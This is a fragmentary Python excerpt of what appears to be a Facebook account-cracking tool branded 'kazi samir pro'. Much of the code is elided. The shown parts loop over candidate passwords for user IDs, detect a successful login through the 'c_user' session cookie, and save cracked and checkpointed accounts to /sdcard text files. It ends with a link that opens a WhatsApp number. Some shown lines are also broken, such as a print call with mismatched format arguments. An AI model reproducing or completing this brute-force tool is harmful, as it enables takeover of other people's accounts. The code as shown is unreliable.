...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/SAMIR-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/SAMIR-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to RETURN TO SAMIR Menu ")
...
def R():
			...
			print ("\033[1m [!] Tool    : kazi samir pro")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[samir]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    open('/sdcard/SAMIR_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/samir_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      ITX SAMIR HERE \033[1;37m")
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+8801840261060")
